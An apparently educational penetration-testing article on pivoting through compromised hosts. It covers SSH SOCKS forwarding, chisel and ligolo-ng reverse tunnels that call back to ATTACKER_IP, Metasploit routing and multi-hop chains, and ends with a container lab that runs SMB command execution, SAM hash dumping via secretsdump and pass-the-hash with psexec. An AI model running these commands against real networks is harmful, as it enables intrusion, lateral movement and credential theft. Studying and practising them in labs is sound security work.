Pivoting

Using compromised hosts as gateways to reach inaccessible internal networks: SOCKS proxies, SSH dynamic forwarding, chisel, ligolo-ng, Metasploit route pivoting, port scanning through pivots, and multi-hop pivot chains.

Overview

A pivot turns one compromised host into a gateway for every network it can reach. This article separates pivoting from tunneling and port forwarding, then walks through the four common methods: SSH dynamic forwarding, chisel reverse SOCKS , ligolo-ng TUN interfaces, and Metasploit routes. After reading you can route a scan or an exploit through a dual-homed host and chain a second hop to a network the first host cannot see.

Required Reading

  • TCP Handshake - TCP connections, routing, SYN / SYN-ACK / ACK
  • DNS - DNS resolution, resolvers, nameservers

Pivoting vs Tunneling vs Port Forwarding

These terms describe fundamentally different mechanisms. Using them correctly matters when communicating with team members and when selecting the right tool.

Technique Definition OSI Layer Use Case
Port Forwarding Redirecting traffic from one TCP/UDP port to another IP:port pair through an intermediary host. Traffic is forwarded as raw bytes - protocol-agnostic. Layer 4 Expose a single service (RDP 3389, SMB 445) from the internal network to your attacker machine.
Tunneling Encapsulating one protocol inside another, usually to bypass firewall rules that block the outer protocol. Tunnels create a virtual point-to-point link. Layer 3/4 DNS tunneling (iodine), ICMP tunneling (ptunnel), HTTP tunneling (HTTP CONNECT) - for heavily filtered environments where only one protocol is permitted outbound.
Pivoting Using a compromised host as a router to forward arbitrary traffic to an otherwise unreachable network. The pivot host routes IP packets or application-level traffic between your attacker machine and the internal network. Layer 3/4/7 Full network access through the pivot: port scanning, exploiting services, lateral movement. The pivot is the gateway.

This article covers pivoting. Tunneling and port forwarding are separate articles.

The Pivoting Model

Attacker (10.20.30.40)                    Compromised Web Server (192.168.1.10)
    │                                          ├── eth0: 192.168.1.10 (reachable)
    │  SSH / chisel / ligolo                  │
    └──────────────────────────────────────────┤
                                               │
                                               ├── eth1: 10.0.0.10 (internal NIC)
                                               │         │
                                               │         ├── 10.0.0.50 (internal DB server)
                                               │         ├── 10.0.0.51 (internal SMB server)
                                               │         └── 10.0.0.1   (internal router/DC)

The compromised host has two network interfaces: one facing the attacker, one facing the internal network. The pivot turns this dual-homed host into a gateway. From the attacker's perspective, packets destined for 10.0.0.0/24 are sent to the pivot, which routes them into the internal network and relays the responses back.

Method 1 - SSH Dynamic Forward

SSH dynamic forwarding creates a SOCKS proxy on a local port. Applications that speak SOCKS (configured via proxychains or native SOCKS support) can route traffic through the SSH tunnel to the remote host's accessible networks. 

# On the attacker machine:
ssh -D 1080 -N -f user@compromised-host-ip

# -D 1080   : Dynamic application-level port forwarding (SOCKS)
#             Creates a SOCKS proxy on localhost:1080
# -N        : Do not execute a remote command (just forward)
# -f        : Fork to background after authentication

# Verify the SOCKS proxy is listening
ss -tlnp | grep 1080
# LISTEN 0  128  127.0.0.1:1080  0.0.0.0:*  users:(("ssh",pid=12345,fd=4))

# Configure proxychains to use the SOCKS proxy
# Edit /etc/proxychains4.conf:
						
# proxychains configuration (/etc/proxychains4.conf)
cat << 'EOF' | sudo tee /etc/proxychains4.conf
# proxychains configuration
strict_chain
# dynamic_chain — automatically skips dead proxies (less predictable)
# strict_chain — uses proxies in order, fails if any proxy is dead

# Quiet mode — suppresses verbose output from proxychains
quiet_mode

# DNS through proxy — proxychains intercepts DNS requests
# and resolves them through the proxy (prevents DNS leaks)
proxy_dns

# Local network — avoid routing localhost/private traffic through the proxy
localnet 127.0.0.0/255.0.0.0

[ProxyList]
# SOCKS proxy through SSH dynamic forward
socks4  127.0.0.1 1080
# socks5 127.0.0.1 1080   # Use SOCKS5 if the SSH server supports it
EOF
						
# Test the SOCKS proxy
proxychains4 curl -s http://10.0.0.50

# Run nmap through the SOCKS proxy (TCP Connect scan only)
# SYN scan does not work through SOCKS — SOCKS is TCP only
proxychains4 nmap -sT -Pn -n -p 22,80,445,3389 10.0.0.50

# -sT : TCP Connect scan (full TCP handshake — SOCKS compatible)
# -Pn : skip host discovery (assume host is up)
# -n  : no DNS resolution (proxychains handles DNS)

# Run crackmapexec through the proxy
proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p 'password' -d corp.local
						
# SSH dynamic forward with a jump host (Multi-hop pivot)
# Chain two SSH dynamic forwards:
# Attacker → Host A (192.168.1.10) → Host B (10.0.0.50)

# Terminal 1 — SSH -D from Attacker to Host A
ssh -D 1080 -N root@192.168.1.10

# Terminal 2 — SSH -D from Host A to Host B, through the SOCKS proxy
proxychains4 ssh -D 1081 -N root@10.0.0.50

# Now localhost:1080 routes through Host A; localhost:1081 routes through Host A → Host B.
# Configure proxychains for the second proxy to reach Host B's internal network (10.0.0.0/24).

Why SOCKS Over SSH is Limited

  • TCP only - No UDP (no DNS resolution through the tunnel without proxy_dns in proxychains, which wraps DNS in TCP ). No ICMP .
  • Single TCP connection per stream - nmap Connect scan opens one connection per port. Scanning 1000 ports on one host = 1000 SSH -encrypted SOCKS connections. Slow and noisy.
  • No raw socket support - SYN scan ( -sS ) requires raw sockets, which SOCKS does not provide. Nmap falls back to Connect scan.
  • Latency multiplication - Each TCP round-trip incurs double the encryption overhead (attacker -> server -> target, then back).

Method 2 - Chisel (Reverse SOCKS)

Chisel is a single binary that creates a TCP / UDP tunnel over HTTP or HTTPS . It uses WebSocket framing, making it look like a long-lived HTTPS connection. The reverse mode is the standard pivoting deployment: the compromised host connects BACK to your attacker machine, and that connection becomes the SOCKS conduit.

No open ports on the compromised host. No inbound firewall rules needed. The compromised host initiates ONE outbound HTTPS connection - indistinguishable from normal web browsing - and that connection carries all your pivoting traffic. 

# On the ATTACKER machine (server mode, listening for reverse connections)
chisel server -p 8080 --reverse --socks5

# -p 8080      : listen port (use 443 for better OPSEC — looks like HTTPS)
# --reverse    : allow reverse port forwarding from clients
# --socks5     : enable SOCKS5 proxy on the server side
#                (clients connect back; the proxy endpoint is on the server)

# Output:
# [server] Listening on http://0.0.0.0:8080
						
# On the COMPROMISED HOST (client mode, connects back to attacker)
# Upload chisel binary first (single static binary, ~8MB with go build)
./chisel client ATTACKER_IP:8080 R:socks

# ATTACKER_IP:8080  : attacker's chisel server address
# R:socks           : Reverse — create a SOCKS proxy on the SERVER (attacker)
#                     The compromised host connects back, and the SOCKS endpoint
#                     opens on the attacker's machine (localhost:1080 by default)

# Alternative: specify a custom SOCKS port on the attacker
./chisel client ATTACKER_IP:8080 R:2080:socks
# SOCKS proxy available on attacker's localhost:2080
						
# On the ATTACKER — use the SOCKS proxy
proxychains4 nmap -sT -Pn -n -p 22,80,445,3389,1433,3306,5985 10.0.0.50
proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p password
proxychains4 psexec.py corp.local/jsmith:password@10.0.0.50
						
# Chisel — forward a single port through the reverse tunnel
# Useful when you need RDP/SSH to a specific internal host via the pivot

# On compromised host:
./chisel client ATTACKER_IP:8080 R:3389:10.0.0.50:3389
# R:3389:10.0.0.50:3389
#    Reverse port forward: port 3389 on ATTACKER → 10.0.0.50:3389
#    R:ATTACKER_PORT:INTERNAL_IP:INTERNAL_PORT

# Now on the attacker:
xfreerdp /v:127.0.0.1 /u:jsmith  # connects to 10.0.0.50:3389 through the pivot
						
# Chisel — full SOCKS5 with authentication (prevents others from using your proxy)
# Server:
chisel server -p 8080 --reverse --socks5 --auth myuser:mypassword

# Client:
./chisel client --auth myuser:mypassword ATTACKER_IP:8080 R:socks

# proxychains config:
# socks5 127.0.0.1 1080 myuser mypassword

Method 3 - Ligolo-ng TUN

Ligolo-ng creates a TUN (network tunnel) interface - a virtual network adapter at Layer 3. This means all protocols work through the pivot: TCP , UDP , ICMP , raw sockets. Nmap SYN scans, SMB enumeration, full TCP stack behavior - everything that a dual-homed router can do, ligolo-ng can do.

The architecture: ligolo-ng has two components: - Proxy : Runs on the attacker machine. Creates a TUN interface and routes traffic through agent connections. - Agent : Runs on the compromised host. Connects to the proxy and forwards traffic to/from the internal network. 

# Step 1 — On the ATTACKER (setup proxy and TUN interface)
# Create the TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
# (sudo required to create TUN; runs as the specified user afterward)

# Enable the TUN interface
sudo ip link set ligolo up

# Assign an IP to the TUN interface — this IP is part of the internal network
# but does not conflict with any existing host
sudo ip addr add 10.0.0.99/24 dev ligolo

# Start the ligolo-ng proxy
ligolo-proxy -selfcert

# -selfcert : auto-generate TLS certificate for agent-proxy encryption
# The proxy listens on 0.0.0.0:11601 by default (change with -laddr)
						
# Step 2 — On the COMPROMISED HOST (connect agent to proxy)
./ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# -ignore-cert : accept self-signed TLS certificate (OK in lab/live engagements)
# The agent establishes a persistent TLS connection to the proxy.
						
# Step 3 — Back on the ATTACKER (configure and activate)
# In the ligolo-ng proxy terminal, select the connected agent session:
ligolo-ng » session
# Select the agent (listed by name/hostname)
# Now in the session context:

# Option A — Add a route to the internal network via the agent
ligolo-ng » ip route add 10.0.0.0/24

# Option B — Start a tunnel that routes all traffic for specified networks
ligolo-ng » start

# At this point, the TUN interface (ligolo) routes packets for 10.0.0.0/24
# through the agent's TLS connection to the compromised host.
# All protocols work: TCP, UDP, ICMP.
						
# Step 4 — Verify connectivity
# The attacker's ligolo TUN interface (10.0.0.99) can now reach the internal network.
ping 10.0.0.50 -c 2
# PING 10.0.0.50 (10.0.0.50) 56(84) bytes of data.
# 64 bytes from 10.0.0.50: icmp_seq=1 ttl=127 time=2.5 ms

# Full nmap scan — SYN scan works because TUN supports raw sockets
sudo nmap -sS -Pn -p 1-1000 10.0.0.50

# crackmapexec — SMB the internal host directly (no proxychains)
crackmapexec smb 10.0.0.50 -u jsmith -p 'password' -d corp.local
						
# Multi-hop with ligolo-ng — chain two agents
# Attacker → Host A (192.168.1.10) → Host B (10.0.0.50)

# On the attacker:
#   Host A's agent connects to proxy
#   Add route: 10.0.0.0/24 via Host A

# Host A now has ligolo-agent running, connecting back to attacker.
# On the attacker, there is a listener relay:
ligolo-ng » listener_add --addr 0.0.0.0:11602 --to 10.0.0.50:11601

# Now upload ligolo-agent to Host B (through the pivot):
proxychains4 scp ligolo-agent root@10.0.0.50:/tmp/

# On Host B:
./ligolo-agent -connect 10.0.0.99:11602 -ignore-cert
# 10.0.0.99 is the attacker's TUN IP, reachable from Host B through Host A

# Back on attacker:
ligolo-ng » session  # select Host B's agent
ligolo-ng » ip route add 172.16.0.0/24  # a third network behind Host B
ligolo-ng » start

Method 4 - Metasploit Route Pivoting

When you have a Meterpreter session on a compromised host, Metasploit can route traffic through that session to reach internal networks. Meterpreter sessions already have a built-in communication channel; the route command tells Metasploit to use that channel as a gateway. 

# Start Metasploit
msfconsole

# Already have a Meterpreter session (session 1) on the pivot host
# Step 1 — Add a route to the internal network through that session
route add 10.0.0.0/24 1

# Step 1b — Automatically add routes for all known subnets on the pivot
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.0.0.0/24
run

# Step 2 — Start the SOCKS proxy (for external tools like proxychains)
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
# -j : run as a background job
						
# Step 3 — Use the Metasploit SOCKS proxy with proxychains
# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p password

# Step 4 — Use Metasploit modules directly through the route
# Metasploit modules route through added routes automatically — no proxychains needed
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.0.0.50
set SMBUser jsmith
set SMBPass password
set SMBDomain corp.local
run
						
# Metasploit port scanning through the pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.50
set PORTS 22,80,445,3389,1433,3306,5985,5986
run

Limitation : The Metasploit SOCKS proxy is slow for port scanning. Each port probe creates a new route lookup and Meterpreter packet. For fast scanning, prefer ligolo-ng TUN. Use Metasploit routes for exploiting detected services - that part is fast because Metasploit modules route natively.

Multi-Hop / Double Pivoting

When the internal network itself contains a host that can reach a third network, you need double pivoting. 

Attacker → Host A (192.168.1.10) → Host B (10.0.0.50) → Network C (172.16.0.0/24)

Double Pivot with Proxychains

# proxychains supports chaining multiple proxies:
# /etc/proxychains4.conf
# [ProxyList]
# socks5  127.0.0.1 1080  # → Host A
# socks5  127.0.0.1 1081  # → Host B (reached through 1080)

# Step 1 — SSH -D to Host A
ssh -D 1080 -N root@192.168.1.10

# Step 2 — SSH -D to Host B through Host A
proxychains4 ssh -D 1081 -N root@10.0.0.50

# Step 3 — Now localhost:1081 routes Attacker → Host A → Host B → Network C
proxychains4 nmap -sT -Pn -n 172.16.0.0/24

Double Pivot with Chisel (Chaining)

# Host A → Attacker (reverse SOCKS)
# Attacker-side:
chisel server -p 8080 --reverse --socks5
# Host A-side:
./chisel client ATTACKER_IP:8080 R:1080:socks
# Now localhost:1080 on attacker is a SOCKS proxy through Host A

# Host B → Attacker (reverse SOCKS, through Host A)
# Host B connects back to attacker THROUGH Host A:
# On attacker, expose a chisel server reachable from the internal network
# via a local forward through the first chisel tunnel:
# Actually, run a second chisel server and have Host B tunnel through Host A:

# Method: Run chisel server on Host A (reachable by Host B)
# SSH to Host A through SOCKS:
proxychains4 ssh root@192.168.1.10
# On Host A:
chisel server -p 9090 --reverse --socks5
# Now Host B connects to Host A:
./chisel client 10.0.0.10:9090 R:socks
# (10.0.0.10 is Host A's internal IP)

# But the second SOCKS endpoint is on Host A, not on the attacker.
# Port forward it back:
# On attacker, forward Host A's SOCKS port to your localhost:
ssh -L 1081:localhost:1080 -N root@192.168.1.10
# Now localhost:1081 = Host A's SOCKS = Host B's internal routes

Double Pivot with Ligolo-ng (Simplest)

Ligolo-ng handles multi-hop natively with listener relay. Already covered above: listener_add on the proxy creates a relay endpoint that the second-hop agent can connect to.

Port Scanning Through a Pivot

SOCKS proxies limit you to TCP Connect scans. TUN interfaces allow SYN scans. The difference in speed is dramatic. 

# Through SOCKS (slow — each port is a separate TCP handshake)
proxychains4 nmap -sT -Pn --top-ports 100 10.0.0.50
# 100 ports ≈ 5-10 minutes through SOCKS

# Through TUN (fast — raw socket, SYN scan)
sudo nmap -sS -Pn --top-ports 100 10.0.0.50
# 100 ports ≈ 5-15 seconds through TUN
						
# Port scanning without nmap — bash built-in /dev/tcp
# Works through SOCKS when proxychains wraps it
for port in 22 80 445 3389 1433 3306 5985 5986 8080 8443; do
    timeout 2 bash -c "echo >/dev/tcp/10.0.0.50/$port" 2>/dev/null && \
        echo "Port $port: OPEN" || echo "Port $port: closed"
done

# Python port scanner (supports SOCKS via socks module)
python3 -c "
import socket, sys
target = '10.0.0.50'
for port in [22, 80, 445, 3389, 1433, 3306, 5985, 5986, 8080, 8443]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    result = s.connect_ex((target, port))
    if result == 0:
        print(f'Port {port}: OPEN')
    s.close()
"
						
# Fast port scan through SOCKS — use masscan with a custom wrapper
# masscan does not support SOCKS natively. Alternatives:
# 1. ligolo-ng TUN (masscan works through TUN natively)
sudo masscan 10.0.0.0/24 -p445 --rate 10000

# 2. Port scan in parallel with bash + proxychains
seq 1 254 | xargs -P 20 -I {} bash -c \
    "timeout 2 bash -c 'echo >/dev/tcp/10.0.0.{}/445' 2>/dev/null && echo '10.0.0.{}:445 OPEN'"

Route Management on the Attacker

When using TUN-based pivoting, you must tell the Linux kernel which traffic goes through the virtual interface. 

# View the routing table
ip route show

# Traffic to 10.0.0.0/24 goes through ligolo TUN
# Traffic to 10.0.0.99 (the TUN's own IP) goes through the TUN

# Add a route for internal network access (only needed if ligolo doesn't auto-route)
sudo ip route add 10.0.0.0/24 dev ligolo

# Add a more specific route (host route)
sudo ip route add 10.0.0.50/32 dev ligolo

# Check which interface a packet to an internal IP would take
ip route get 10.0.0.50
# 10.0.0.50 dev ligolo src 10.0.0.99 uid 1000

# Remove routes when done
sudo ip route del 10.0.0.0/24 dev ligolo

# Remove the TUN interface
sudo ip link del ligolo
						
# Network documentation — always document your pivot routes
# Save a network topology diagram for your engagement notes:

cat << 'EOF' >> engagement_notes.md
## Pivot Topology

### Hop 1: Web Server (192.168.1.10)
- Compromised via: SSH creds (root:password123)
- Internal NIC: 10.0.0.10/24 (eth1)
- Pivot tool: chisel reverse SOCKS on port 1080
- Accessible networks: 10.0.0.0/24

### Hop 2: Internal DB Server (10.0.0.50)
- Compromised via: SMB PtH (administrator hash from secretsdump)
- Internal NIC 2: 172.16.0.50/24
- Pivot tool: SSH dynamic forward on port 1081 (reached through proxychains)
- Accessible networks: 172.16.0.0/24

### Active Routes:
- localhost:1080 → 10.0.0.0/24 (through 192.168.1.10)
- localhost:1081 → 172.16.0.0/24 (through 10.0.0.50, via 1080)
EOF

File Transfer Through Pivots

# SCP through an SSH proxy
# Using ProxyCommand:
scp -o "ProxyCommand=nc -x 127.0.0.1:1080 %h %p" \
    file.txt root@10.0.0.50:/tmp/

# Using ProxyJump (SSH to Host A, then to Host B):
scp -o "ProxyJump=root@192.168.1.10" file.txt root@10.0.0.50:/tmp/

# Using -J flag:
scp -J root@192.168.1.10 file.txt root@10.0.0.50:/tmp/
						
# HTTP-based file transfer through proxychains:
# On the internal host, start an HTTP server:
proxychains4 ssh root@10.0.0.50 "cd /tmp && python3 -m http.server 8080"

# On attacker, download through proxychains:
proxychains4 curl -O http://10.0.0.50:8080/loot.tar.gz

# Or upload a file:
proxychains4 curl -T chisel_linux_amd64 http://10.0.0.50:8080/

Pivoting Tools Comparison

Tool Type Protocols Speed Setup Complexity Requires Outbound Port OPSEC
SSH -D SOCKS5 (TCP only) TCP Medium Low - single command TCP 22 outbound Good - standard SSH traffic
Chisel SOCKS5 (TCP only) over HTTP/HTTPS TCP Medium Low - two commands TCP 443 (configurable) Excellent - looks like HTTPS/WebSocket
Ligolo-ng TUN (Layer 3 - all protocols) TCP, UDP, ICMP, raw sockets High - native network stack Medium - TUN setup TCP 11601 (configurable) Good - TLS-encrypted custom protocol
Metasploit route Meterpreter channel + SOCKS5 TCP Slow for scans, normal for exploits Medium - requires meterpreter session Same as meterpreter (TCP 4444) Depends on payload
sshuttle TUN-like (iptables + SSH) TCP, DNS High Low - one command, no agent needed TCP 22 outbound Good - standard SSH traffic
rpivot SOCKS4 (TCP only) TCP Medium Medium - Python-based TCP 9999 (configurable) Fair - cleartext SOCKS, identifiable Python traffic
dnscat2 / iodine DNS tunnel (IP over DNS) All (encapsulated in DNS) Very slow - DNS overhead High - DNS record configuration DNS outbound (UDP 53) Fair - high volume of DNS queries is anomalous
3proxy SOCKS5 / HTTP proxy TCP Medium Medium - compile + config TCP 1080 (configurable) Fair - cleartext SOCKS 
# sshuttle — transparent proxy through SSH
# Does not require an agent on the compromised host. Uses iptables
# on the attacker to route traffic through an SSH pipe.
sudo sshuttle -r root@192.168.1.10 10.0.0.0/24

# -r : remote host (the pivot)
# 10.0.0.0/24 : subnet to route through the pivot
# sshuttle creates a Python script on the remote, runs it, and uses
# iptables to redirect traffic for 10.0.0.0/24 through the SSH tunnel.

# After sshuttle starts, all traffic to 10.0.0.0/24 is transparently routed:
ping 10.0.0.50
nmap -sS 10.0.0.50
curl http://10.0.0.50
# No proxychains needed. No SOCKS configuration. It just works.

Common Mistakes

Forgetting to enable 'proxy_dns' in proxychains. Without proxy_dns , DNS queries leak to your local resolver and fail for internal hostnames. With proxy_dns , proxychains intercepts gethostbyname() calls and tunnels the DNS query through the proxy. If you see Could not resolve hostname despite the host being reachable, check your proxychains config.

Using the wrong nmap scan type through SOCKS. SYN scan ( -sS ) through SOCKS will fail silently or hang. Always use -sT ( TCP Connect) when scanning through a SOCKS proxy. Through a TUN (ligolo-ng), all scan types work.

Running chisel client as root on the pivot host. Not necessary. Chisel does not need root privileges for a SOCKS proxy. It only needs outbound network access. Running as root is a detection risk (creates a root-process audit trail). Use the lowest-privileged user available.

Overloading the pivot with too many parallel connections. SOCKS proxies handle one TCP stream per connection. Running nmap with --min-parallelism 100 through a single SSH -D connection will overwhelm the SSH multiplexer and cause timeouts. Limit parallelism to 10-20 connections, or use ligolo-ng TUN which benefits from the kernel's TCP stack.

Not documenting routes. Multi-hop pivots create complex routing chains. Without documentation, you will lose track of which local port routes to which network. Write it down immediately. The engagement notes are your map - without them, you are navigating blind.

Assuming internal DNS works from the attacker machine. When you pivot, the pivot host resolves DNS using ITS resolver, not yours. If the pivot host uses an internal DNS server (e.g., a DC at 10.0.0.1), hostnames like fileserver.corp.local resolve, but your attacker machine cannot resolve them unless you configure proxychains proxy_dns or use the pivot host's DNS server explicitly: 

# Through the pivot, query the internal DNS server
proxychains4 dig @10.0.0.1 fileserver.corp.local

Cleaning up TUN interfaces after engagement. Leaving TUN interfaces and routes active on your attacker machine causes traffic leakage and connectivity issues in subsequent scans. Clean up: 

sudo ip link del ligolo
sudo ip route del 10.0.0.0/24 || true

Challenge

Build the pivot and the internal target, reach the internal host at 10.0.0.50 through the pivot, and enumerate its SMB shares. Use chisel and ligolo-ng, then document every route.

pivoting.Containerfile

# 1. Create the external and internal networks:
podman network create --subnet 192.168.1.0/24 external-net
podman network create --subnet 10.0.0.0/24 --internal internal-net

# 2. Build the pivot and the internal target:
podman build -t pivoting-lab-pivot -f pivoting.Containerfile --build-arg ROLE=pivot .
podman build -t pivoting-lab-internal -f pivoting.Containerfile --build-arg ROLE=internal .

# 3. Run the internal target first, then the dual-homed pivot:
podman run -d --name internal-target --network internal-net --ip 10.0.0.50 pivoting-lab-internal
podman run -d --name pivot-host --network external-net --ip 192.168.1.10 -p 2222:22 pivoting-lab-pivot
podman network connect internal-net pivot-host --ip 10.0.0.10

# 4. SSH into the pivot and confirm the internal host is reachable:
ssh root@localhost -p 2222   # password: redteam
ping -c 2 10.0.0.50

# 5. Cleanup:
podman stop pivot-host internal-target
podman rm pivot-host internal-target
podman network rm external-net internal-net

This lab simulates a compromised web server with dual-homed networking.

Scenario : You have compromised a web server at 192.168.1.10 via an SSH credential. The server has a second NIC on 10.0.0.0/24. An internal host at 10.0.0.50 runs SMB and SSH and is otherwise unreachable from the internet.

Phase 1 - Compromise the Pivot Host

# SSH access to the compromised web server
ssh root@192.168.1.10
# (Credential obtained via prior exploitation — not covered here)

# Discover internal networks from the pivot host
hostname

# Enumerate network interfaces
ip addr show
# 1: eth0: 192.168.1.10/24  (external — reachable by attacker)
# 2: eth1: 10.0.0.10/24     (internal — NOT reachable by attacker)

# Enumerate routing table
ip route show
# default via 192.168.1.1 dev eth0
# 10.0.0.0/24 dev eth1 proto kernel scope link src 10.0.0.10

# The pivot host can reach 10.0.0.0/24. Check connectivity:
ping -c 2 10.0.0.50
# 64 bytes from 10.0.0.50: icmp_seq=1 ttl=64 time=0.5ms

# Quick ARP scan of the internal subnet (from pivot host)
for ip in $(seq 1 254); do
    (ping -c 1 -W 1 10.0.0.$ip > /dev/null 2>&1 && echo "10.0.0.$ip: ALIVE") &
done | sort -t. -k4 -n > internal-hosts.txt
wait
cat internal-hosts.txt
# 10.0.0.1: ALIVE   (internal gateway)
# 10.0.0.10: ALIVE  (self)
# 10.0.0.50: ALIVE  (target internal host)

# Exit the pivot host
exit

Phase 2 - Set Up the Pivot with Chisel

# On the ATTACKER — start chisel server
chisel server -p 443 --reverse --socks5
# [server] Listening on http://0.0.0.0:443

# Upload chisel to the pivot host (already compiled for Linux amd64)
scp chisel root@192.168.1.10:/tmp/chisel

# On the PIVOT HOST — connect back to attacker
ssh root@192.168.1.10
chmod +x /tmp/chisel
/tmp/chisel client ATTACKER_IP:443 R:1080:socks &

# Verify the client connected:
# Attacker terminal shows: [server] session 1: tun
# SOCKS proxy now available on attacker's localhost:1080

Phase 3 - Scan Internal Network

# On the ATTACKER — configure proxychains
# Already configured: /etc/proxychains4.conf → socks5 127.0.0.1 1080

# Port scan the internal host through the SOCKS proxy
proxychains4 nmap -sT -Pn -n -p 22,80,445,3389,1433,3306,5985,5986 10.0.0.50

# Expected output:
# PORT     STATE  SERVICE
# 22/tcp   open   ssh
# 445/tcp  open   microsoft-ds
# 3389/tcp closed ms-wbt-server
# 5985/tcp closed wsman

# The internal host at 10.0.0.50 exposes SSH (22) and SMB (445).

Phase 4 - Internal Services

# Check SMB access on the internal host
proxychains4 crackmapexec smb 10.0.0.50

# SMB enumeration
proxychains4 crackmapexec smb 10.0.0.50 --shares

# If we have credentials:
proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p 'password' -d corp.local

# Execute a command on the internal host
proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p 'password' -d corp.local \
    -x 'ipconfig /all'

# Dump SAM hashes
proxychains4 secretsdump.py corp.local/jsmith:password@10.0.0.50

Phase 5 - Compromise the Internal Host

# Obtain an interactive shell on the internal host via PtH
# (assuming we extracted the NTLM hash in Phase 4)
proxychains4 psexec.py -hashes :ntlm_hash corp.local/administrator@10.0.0.50

# Or via WinRM (if enabled)
proxychains4 evil-winrm -i 10.0.0.50 -u administrator -H ntlm_hash

# From the shell on 10.0.0.50, continue the engagement:
# - Enumerate its network interfaces (may have a third NIC on 172.16.0.0/24)
# - Set up a SECOND pivot with chisel/ligolo-ng for the third network
# - Document the multi-hop topology in your engagement notes

Phase 6 - Ligolo-ng Walkthrough

# On the ATTACKER — setup ligolo-ng
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip addr add 10.0.0.99/24 dev ligolo
ligolo-proxy -selfcert

# Upload ligolo-agent to pivot host
scp ligolo-agent root@192.168.1.10:/tmp/

# On the PIVOT HOST — connect agent
ssh root@192.168.1.10
/tmp/ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert &

# On the ATTACKER — in ligolo proxy terminal:
ligolo-ng » session
ligolo-ng » ip route add 10.0.0.0/24
ligolo-ng » start

# Now scan the internal network at full speed — no proxychains needed
sudo nmap -sS -sV -p 22,80,445,1433,3306,5985,5986 10.0.0.0/24

# Direct SMB access (the ligolo TUN routes traffic natively)
crackmapexec smb 10.0.0.50 -u jsmith -p 'password' -d corp.local
psexec.py corp.local/jsmith:password@10.0.0.50
